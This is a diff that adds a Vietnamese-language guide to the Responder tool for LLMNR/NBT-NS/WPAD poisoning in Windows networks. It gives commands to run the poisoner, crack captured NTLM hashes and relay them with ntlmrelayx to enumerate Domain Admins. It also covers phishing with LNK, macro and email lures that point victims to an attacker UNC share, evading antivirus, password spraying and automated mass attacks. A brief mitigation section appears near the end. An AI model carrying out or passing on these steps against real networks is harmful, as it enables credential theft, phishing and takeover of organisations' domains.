@@ -1,0 +1,176 @@
+1. Responder là gì?
+
+    Responder là tool tấn công giao thức phát quảng bá (broadcast) trong mạng Windows nội bộ:
+
+        Giả mạo SMB/NetBIOS/LLMNR/MDNS/WPAD – chiếm credential khi máy trong mạng gửi request hỏi “ai là server này?”
+
+        Trả lời và ghi lại hash NTLMv1/v2, credential, cookie, token...
+
+        Có thể relay, “pass-the-hash” qua module riêng, hoặc dùng để crack hash, escalate quyền.
+
+        Phát hiện lỗ hổng “Windows name resolution poisoning” (thường có ở mọi AD, network văn phòng).
+
+2. Cài đặt Responder
+A. Kali/Ubuntu/Debian
+
+sudo apt update
+sudo apt install responder
+
+    Đường dẫn thường là /usr/share/responder/
+
+B. Cài bản mới nhất (khuyên dùng cho red team/lab)
+
+git clone https://github.com/lgandx/Responder.git
+cd Responder
+sudo pip3 install -r requirements.txt
+
+    Chạy file: sudo python3 Responder.py -h
+
+3. Nguyên lý hoạt động của Responder
+
+    Khi một máy Windows tìm tên qua LLMNR, NBT-NS, MDNS, WPAD (do user nhập sai UNC path, printer mapping, hoặc khi máy join domain, mở file share, proxy tự động...),
+
+    Responder trả lời giả “server là tôi!” rồi ghi lại credential/hash khi máy victim gửi authentication.
+
+    Sau đó, attacker có thể crack hash, relay lên dịch vụ khác (SMB, HTTP, RDP...) để chiếm quyền, lateral movement.
+
+4. Thực chiến Responder cơ bản
+A. Xác định interface mạng
+
+ip a
+# Ví dụ: eth0, wlan0
+
+B. Khởi động Responder
+
+sudo responder -I eth0
+
+    -I: Chọn interface (cực kỳ quan trọng)
+
+    Responder sẽ bắt đầu lắng nghe các protocol: LLMNR, NBT-NS, MDNS, SMB, HTTP, WPAD...
+
+C. Theo dõi log
+
+    Tất cả credential/hash, token sẽ được ghi trong logs/ hoặc in ra màn hình.
+
+    Kiểm tra file Responder-Session.log và các file .NTLMv1, .NTLMv2 để xem credential thu được.
+
+5. Các option nâng cao cực mạnh của Responder
+Option	Chức năng
+-I <interface>	Chọn interface lắng nghe
+-w	Giả mạo WPAD (proxy)
+-r	Bật rogue DNS (spoof DNS)
+-f	Giả mạo file server (SMB/HTTP)
+-v	Verbose mode
+-b <Bind IP>	Bind Responder tới 1 IP cụ thể
+-A	Chỉ phân tích, không trả lời spoof (analysis mode)
+--lm	Force máy victim dùng LM Hash (rất yếu, crack dễ)
+-F	Force NTLM authentication
+-d	Disable mã hóa challenge SMB (để lấy hash dễ hơn)
+-e	Kết hợp với module external relay (smbrelayx, ntlmrelayx)
+
+Ví dụ tắt dịch vụ không muốn spoof (cho stealth, bypass AV):
+
+sudo responder -I eth0 -wF --disable-ftp --disable-sql --disable-dns --disable-ldap
+
+6. Workflow tấn công thực tế với Responder
+A. Bắt hash khi user share folder, truy cập UNC, chạy file lạ
+
+    Chờ user victim truy cập UNC path (\share\files), mở file network, join domain, v.v.
+
+    Thường khi gửi phishing, file shortcut/LNK, macro, payload “\attacker\share” → victim tự động gửi credential!
+
+B. Crack hash lấy được với hashcat/john
+
+    NTLMv2
+
+john --format=netntlmv2 hash.txt --wordlist=rockyou.txt
+# hoặc
+hashcat -m 5600 hash.txt rockyou.txt
+
+LM hash (rất yếu, crack cực nhanh, nếu may mắn có):
+
+    hashcat -m 3000 hash.txt rockyou.txt
+
+C. Relay hash tấn công lateral movement
+
+    Tấn công SMB relay/NTLM relay (smbrelayx, ntlmrelayx.py của impacket):
+
+        Khi user victim đăng nhập, Responder giữ hash và relay sang host khác (đã có SMB, RDP, WinRM...), chiếm quyền hoặc chạy command trên server khác.
+
+        Ví dụ:
+
+        ntlmrelayx.py -tf targets.txt -smb2support -c "net group \"Domain Admins\" /domain"
+
+7. Một số attack workflow mạnh
+A. Phishing LNK/Macro
+
+    Gửi shortcut LNK chứa UNC path (\attacker\share), user chỉ cần click, credential auto gửi về.
+
+B. Phishing WPAD (proxy autoconfig)
+
+    Kích hoạt spoof WPAD: -w
+
+    Nếu máy nạn nhân dùng proxy tự động (nhiều công ty bật sẵn), credential sẽ leak khi victim truy cập web.
+
+C. SMB capture qua phishing mail
+
+    Chèn UNC link vào Word/Excel, macro, web, email – credential sẽ tự leak khi user mở.
+
+D. Tự động brute-force password spray
+
+    Dùng credential thu được để thử đăng nhập WinRM, SMB, RDP, OWA, v.v. hoặc crack offline.
+
+8. Automation/script hóa Responder
+
+    Kết hợp với netdiscover, nmap để scan subnet, tự động attack hàng loạt.
+
+    Script tự động run responder, parse log, crack hash, gửi alert/report.
+
+    Chain với ntlmrelayx.py (impacket) để tự động lateral movement, escalate privilege.
+
+9. Fix lỗi thực tế
+Lỗi	Cách xử lý
+Không thu được hash	Chọn đúng interface, subnet đúng, kiểm tra firewall, user chưa truy cập UNC/proxy, đã tắt LLMNR/NBT-NS trên client
+Hash không crack được	Dùng wordlist mạnh hơn, thử spray credential lên dịch vụ nội bộ, chờ thêm victim
+Không relay được	Dịch vụ target không hỗ trợ relay (SMB signing bật), dùng relay HTTP hoặc các lỗ hổng khác
+Responder bị AV phát hiện	Bật/tắt module, chỉnh stealth, dùng version custom, đổi cổng hoặc phối hợp bettercap
+Log không lưu	Check permission folder logs/, chạy với sudo
+10. Phòng chống Responder/LLMNR/NBT-NS attack
+
+    Tắt LLMNR/NBT-NS trên máy Windows/group policy
+
+    Tắt WPAD, cấu hình proxy manual
+
+    Cấu hình SMB signing bắt buộc
+
+    Yêu cầu SMBv3/NTLMv2, disable LM hash
+
+    Quét/giám sát broadcast traffic bất thường, cảnh báo ARP/DNS spoof
+
+    Audit account/password, không dùng pass yếu
+
+11. So sánh Responder với các tool khác
+Tool	Ưu điểm Responder	Khác biệt
+Responder	MITM broadcast mạnh nhất, automation cao, tích hợp SMB/HTTP/LLMNR/WPAD, log chi tiết	Không relay hash SMBv2 (cần impacket), bị AV detect dần
+impacket ntlmrelayx	Relay hash mạnh, exploit lateral, automate chain với Responder	Không tự trả lời LLMNR, phải phối hợp
+Bettercap	MITM giao thức nâng cao, mobile, HTTPS, fake ARP, live injection	Không focus Windows broadcast, cần script hóa thêm
+Ettercap	MITM, GUI/TUI, filter traffic, fake DNS	Không chuyên Windows, kém hiệu quả với SMB hash
+Wireshark/tcpdump	Phân tích log traffic, forensic	Không MITM, không tự động trả lời
+12. Tài liệu, link hữu ích
+
+    Responder Github
+
+    Hacktricks LLMNR/NBT-NS Poisoning
+
+    PayloadAllTheThings – Responder
+
+    CrackStation
+
+    Impacket ntlmrelayx
+
+Tóm tắt nhanh
+
+    Responder: tool tấn công giao thức broadcast LAN mạnh nhất cho pentest/red team – chiếm credential, relay hash, exploit lateral movement, crack NTLM, mở rộng đường tấn công AD, automation script, phishing LNK, macro, WPAD.
+
+    Nên chain với ntlmrelayx, hashcat, script brute, phishing để chiếm domain, escalate, tấn công lateral mạnh.
+
